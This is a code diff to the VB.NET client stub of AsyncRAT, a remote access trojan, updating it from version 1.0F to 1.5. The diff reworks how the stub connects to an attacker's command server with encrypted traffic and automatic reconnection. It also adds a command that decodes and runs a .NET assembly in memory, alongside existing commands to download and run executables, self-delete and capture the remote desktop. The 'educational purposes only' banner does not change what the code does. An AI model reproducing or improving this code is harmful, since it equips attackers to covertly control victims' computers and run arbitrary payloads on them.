@@ -33,33 +33,19 @@ Imports System.Text
 #End If
 
 
+'
+
+'       │ Author     : NYAN CAT
+'       │ Name       : AsyncRAT
+
+'       Contact Me   : https://github.com/NYAN-x-CAT
+
+'       This program Is distributed for educational purposes only.
+
+'
+
 
 Namespace AsyncRAT_Stub
-
-    Public Class Main
-
-        '
-
-        '       │ Author     : NYAN CAT
-        '       │ Name       : AsyncRAT
-
-        '       Contact Me   : https://github.com/NYAN-x-CAT
-
-        '       This program Is distributed for educational purposes only.
-
-        '
-        Public Shared Sub Main()
-
-            Dim T1 As New Thread(New ThreadStart(AddressOf Program.BeginConnect))
-            T1.Start()
-
-            Dim T2 As New Thread(New ThreadStart(AddressOf Program.Ping))
-            T2.Start()
-
-        End Sub
-
-    End Class
-
 
     Public Class Settings
 #If VS Then
@@ -71,7 +57,7 @@ Namespace AsyncRAT_Stub
         Public Shared ReadOnly Ports As New Collections.Generic.List(Of Integer)({%PORT%})
         Public Shared ReadOnly KEY As String = "%KEY%"
 #End If
-        Public Shared ReadOnly VER As String = "v1.0F"
+        Public Shared ReadOnly VER As String = "v1.5"
         Public Shared ReadOnly SPL As String = "<<Async|RAT>>"
     End Class
 
@@ -79,34 +65,71 @@ Namespace AsyncRAT_Stub
     Public Class Program
 
         Public Shared isConnected As Boolean = False
-        Public Shared S As Socket
+        Public Shared S As Socket = Nothing
         Public Shared BufferLength As Long = Nothing
         Public Shared Buffer() As Byte
-        Public Shared MS As New MemoryStream
+        Public Shared MS As MemoryStream = Nothing
         Public Shared ReadOnly SPL = Settings.SPL
+        Public Shared allDone As New ManualResetEvent(False)
+        Public Shared Tick As Threading.Timer = Nothing
+
+        Public Shared Sub Main()
+
+            'Do Something Here..
+
+
+
+
+            While True
+                Thread.Sleep(1000)
+                If isConnected = False Then
+                    isDisconnected()
+                    BeginConnect()
+                End If
+                allDone.WaitOne()
+            End While
+
+        End Sub
 
         Public Shared Sub BeginConnect()
 
             Try
                 Thread.Sleep(2500)
+
                 S = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
 
                 BufferLength = -1
                 Buffer = New Byte(0) {}
                 MS = New MemoryStream
 
-                S.ReceiveBufferSize = 50 * 1000 '8192
-                S.SendBufferSize = 50 * 1000 '8192
+                S.ReceiveBufferSize = 50 * 1000
+                S.SendBufferSize = 50 * 1000
 
-                S.Connect(Settings.Hosts.Item(New Random().Next(0, Settings.Hosts.Count)), Settings.Ports.Item(New Random().Next(0, Settings.Ports.Count)))
-
-                isConnected = True
-                Send(Info)
-
-                S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), S)
+                S.BeginConnect(Settings.Hosts.Item(New Random().Next(0, Settings.Hosts.Count)), Settings.Ports.Item(New Random().Next(0, Settings.Ports.Count)), New AsyncCallback(AddressOf EndConnect), Nothing)
 
             Catch ex As Exception
-                isDisconnected()
+                Debug.WriteLine("BeginConnect")
+                isConnected = False
+            End Try
+        End Sub
+
+        Public Shared Sub EndConnect(ByVal ar As IAsyncResult)
+            Try
+                S.EndConnect(ar)
+                Debug.WriteLine("EndConnect : Connected")
+
+                isConnected = True
+                allDone.Set()
+                Send(Info)
+
+                S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), Nothing)
+
+                Dim T As New TimerCallback(AddressOf Ping)
+                Tick = New Threading.Timer(T, Nothing, 30000, 30000)
+
+            Catch ex As Exception
+                Debug.WriteLine("EndConnect : Failed")
+                isConnected = False
             End Try
         End Sub
 
@@ -120,28 +143,36 @@ Namespace AsyncRAT_Stub
         End Function
 
         Public Shared Sub BeginReceive(ByVal ar As IAsyncResult)
-            If isConnected = False Then isDisconnected()
+            If isConnected = False OrElse Not S.Connected Then
+                Debug.WriteLine("BeginReceive : Disconnected")
+                isConnected = False
+                Exit Sub
+            End If
             Try
                 Dim Received As Integer = S.EndReceive(ar)
                 If Received > 0 Then
                     If BufferLength = -1 Then
                         If Buffer(0) = 0 Then
+                            Debug.WriteLine("BeginReceive : Got BufferLength")
                             BufferLength = BS(MS.ToArray)
                             MS.Dispose()
                             MS = New MemoryStream
 
                             If BufferLength = 0 Then
+                                Debug.WriteLine("BeginReceive : Got BufferLength : isNothing")
                                 BufferLength = -1
-                                S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), S)
+                                S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), Nothing)
                                 Exit Sub
                             End If
                             Buffer = New Byte(BufferLength - 1) {}
                         Else
+                            Debug.WriteLine("BeginReceive : Seeking BufferLength")
                             MS.WriteByte(Buffer(0))
                         End If
                     Else
                         MS.Write(Buffer, 0, Received)
                         If (MS.Length = BufferLength) Then
+                            Debug.WriteLine("BeginReceive : Received Full Packet")
                             Dim T As New Thread(New ParameterizedThreadStart(AddressOf Messages.Read))
                             T.Start(MS.ToArray)
                             BufferLength = -1
@@ -150,84 +181,108 @@ Namespace AsyncRAT_Stub
                             Buffer = New Byte(0) {}
                         Else
                             Buffer = New Byte(BufferLength - MS.Length - 1) {}
+                            Debug.WriteLine("BeginReceive : Received Full Packet : NotEqual")
                         End If
                     End If
                 Else
-                    isDisconnected()
+                    Debug.WriteLine("BeginReceive : Disconnected")
+                    isConnected = False
                     Exit Sub
                 End If
-                S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), S)
+                S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), Nothing)
             Catch ex As Exception
-                isDisconnected()
+                Debug.WriteLine("BeginReceive : Failed")
+                isConnected = False
                 Exit Sub
             End Try
         End Sub
 
         Public Shared Sub Send(ByVal msg As String)
-            Try
-                Using MS As New MemoryStream
-                    Dim B As Byte() = AES_Encryptor(SB(msg))
-                    Dim L As Byte() = SB(B.Length & CChar(vbNullChar))
+            If isConnected = True OrElse S.Connected Then
+                Try
+                    Using MS As New MemoryStream
+                        Dim B As Byte() = AES_Encryptor(SB(msg))
+                        Dim L As Byte() = SB(B.Length & CChar(vbNullChar))
 
-                    MS.Write(L, 0, L.Length)
-                    MS.Write(B, 0, B.Length)
+                        MS.Write(L, 0, L.Length)
+                        MS.Write(B, 0, B.Length)
 
-                    S.Poll(-1, SelectMode.SelectWrite)
-                    S.BeginSend(MS.ToArray, 0, MS.Length, SocketFlags.None, New AsyncCallback(AddressOf EndSend), S)
-                End Using
-            Catch ex As Exception
-                isDisconnected()
-            End Try
+                        S.Poll(-1, SelectMode.SelectWrite)
+                        S.BeginSend(MS.ToArray, 0, MS.Length, SocketFlags.None, New AsyncCallback(AddressOf EndSend), Nothing)
+                    End Using
+                Catch ex As Exception
+                    Debug.WriteLine("Send")
+                    isConnected = False
+                End Try
+            Else
+                isConnected = False
+            End If
         End Sub
 
         Private Shared Sub EndSend(ByVal ar As IAsyncResult)
             Try
                 S.EndSend(ar)
             Catch ex As Exception
+                Debug.WriteLine("EndSend")
+                isConnected = False
             End Try
         End Sub
 
         Public Shared Sub isDisconnected()
-            isConnected = False
 
-            Try
-                S.Close()
-                S.Dispose()
-            Catch ex As Exception
-            End Try
+            If Tick IsNot Nothing Then
+                Try
+                    Tick.Dispose()
+                    Tick = Nothing
+                Catch ex As Exception
+                    Debug.WriteLine("Tick.Dispose")
+                End Try
+            End If
 
-            Try
-                MS.Close()
-                MS.Dispose()
-            Catch ex As Exception
-            End Try
+            If MS IsNot Nothing Then
+                Try
+                    MS.Close()
+                    MS.Dispose()
+                    MS = Nothing
+                Catch ex As Exception
+                    Debug.WriteLine("MS.Dispose")
+                End Try
+            End If
 
-            BeginConnect()
+            If S IsNot Nothing Then
+                Try
+                    S.Close()
+                    S.Dispose()
+                    S = Nothing
+                Catch ex As Exception
+                    Debug.WriteLine("S.Dispose")
+                End Try
+            End If
+
+            allDone.Set()
 
         End Sub
 
         Public Shared Sub Ping()
-            While True
-                Thread.Sleep(New Random().Next(30, 60) * 1000)
-                Try
-                    If S.Connected Then
-                        Using MS As New MemoryStream
-                            Dim B As Byte() = AES_Encryptor(SB("PING?"))
-                            Dim L As Byte() = SB(B.Length & CChar(vbNullChar))
+            Try
+                If isConnected = True Then
+                    Using MS As New MemoryStream
+                        Dim B As Byte() = AES_Encryptor(SB("PING?"))
+                        Dim L As Byte() = SB(B.Length & CChar(vbNullChar))
 
-                            MS.Write(L, 0, L.Length)
-                            MS.Write(B, 0, B.Length)
+                        MS.Write(L, 0, L.Length)
+                        MS.Write(B, 0, B.Length)
 
-                            S.Poll(-1, SelectMode.SelectWrite)
-                            S.Send(MS.ToArray, 0, MS.Length, SocketFlags.None)
-                        End Using
-                    End If
-                Catch ex As Exception
-                    isConnected = False
-                End Try
-            End While
+                        S.Poll(-1, SelectMode.SelectWrite)
+                        S.Send(MS.ToArray, 0, MS.Length, SocketFlags.None)
+                        Console.WriteLine("Ping : Sent")
+                    End Using
+                End If
+            Catch ex As Exception
+                Console.WriteLine("Ping : Failed")
+                isConnected = False
+            End Try
         End Sub
-
 
     End Class
 
@@ -249,12 +304,14 @@ Namespace AsyncRAT_Stub
                         Environment.Exit(0)
 
                     Case "DEL"
-                        SelfDelete
+                        SelfDelete()
 
                     Case "UPDATE"
+                        Program.Send("RECEIVED")
                         Download(".exe", A(1), True)
 
                     Case "DW"
+                        Program.Send("RECEIVED")
                         Download(A(1), A(2))
 
                     Case "RD-"
@@ -262,6 +319,10 @@ Namespace AsyncRAT_Stub
 
                     Case "RD+"
                         RemoteDesktop.Capture(A(1), A(2))
+
+                    Case "REFLECTION"
+                        Program.Send("RECEIVED")
+                        Reflection(A(1))
 
                 End Select
             Catch ex As Exception
@@ -300,6 +361,39 @@ Namespace AsyncRAT_Stub
 
                 Diagnostics.Process.Start(Del)
                 Environment.Exit(0)
+            Catch ex As Exception
+                Program.Send("Msg" + SPL + ex.Message)
+            End Try
+        End Sub
+
+        Private Delegate Function ExecuteAssembly(ByVal sender As Object, ByVal parameters As Object()) As Object
+        Private Shared Sub Reflection(ByVal Str As String) 'gigajew@hf
+            Try
+                Dim buffer As Byte() = Convert.FromBase64String(StrReverse(Str))
+                Dim parameters As Object() = Nothing
+                Dim assembly As Assembly = Thread.GetDomain().Load(buffer)
+                Dim entrypoint As MethodInfo = assembly.EntryPoint
+                If entrypoint.GetParameters().Length > 0 Then
+                    parameters = New Object() {New String() {Nothing}}
+                End If
+
+                Dim assemblyExecuteThread As Thread = New Thread(Sub()
+                                                                     Thread.BeginThreadAffinity()
+                                                                     Thread.BeginCriticalRegion()
+                                                                     Dim executeAssembly As ExecuteAssembly = New ExecuteAssembly(AddressOf entrypoint.Invoke)
+                                                                     executeAssembly(Nothing, parameters)
+                                                                     Thread.EndCriticalRegion()
+                                                                     Thread.EndThreadAffinity()
+                                                                 End Sub)
+                If parameters IsNot Nothing Then
+                    If parameters.Length > 0 Then
+                        assemblyExecuteThread.SetApartmentState(ApartmentState.STA)
+                    Else
+                        assemblyExecuteThread.SetApartmentState(ApartmentState.MTA)
+                    End If
+                End If
+
+                assemblyExecuteThread.Start()
             Catch ex As Exception
                 Program.Send("Msg" + SPL + ex.Message)
             End Try
